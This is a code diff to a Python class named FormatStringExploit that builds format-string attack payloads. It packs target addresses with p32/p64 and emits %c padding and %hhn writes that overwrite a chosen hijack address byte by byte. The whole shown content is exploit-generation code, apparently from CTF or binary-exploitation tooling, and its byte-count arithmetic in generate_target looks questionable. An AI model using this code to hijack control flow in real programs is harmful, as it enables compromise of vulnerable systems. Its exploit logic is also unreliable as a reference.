@@ -11,6 +11,10 @@ class FormatStringExploit:
         self.hijack_target = hijack_target
         self.hijack_address = hijack_address
         FormatStringExploit.printed += printed
+        self.table = {
+                32 : [p32, 4],
+                64 : [p64, 6]
+                }
 
     def generate32(self):
 
@@ -19,15 +23,19 @@ class FormatStringExploit:
         adr = sorted(map(get_byte, adr), key=lambda x : (x[1] - 16) & 0xff)
 
         # Start generate payload
-        payload = ''.join(p32(self.hijack_target + i[0]) for i in adr)
-        FormatStringExploit.printed += 16
-        for idx, i in enumerate(adr):
-            byte = i[1]
+        payload = self.generate_target(adr, 32)
+        adr = map(lambda x : x[1], adr)
+        for idx, byte in enumerate(adr):
             pad = ((byte - FormatStringExploit.printed) % 256 + 256) % 256
             if pad > 0:
                 payload += "%{}c".format(pad)
             payload += "%{}$hhn".format(self.offset + idx)
             FormatStringExploit.printed += pad
+        return payload
+
+    def generate_target(self, adr, bits):
+        payload = ''.join(self.table[bits][0](self.hijack_target + i[0]) for i in adr)
+        FormatStringExploit.printed += self.table[bits][1] * (bits / 8)
         return payload
 
     def size(self):
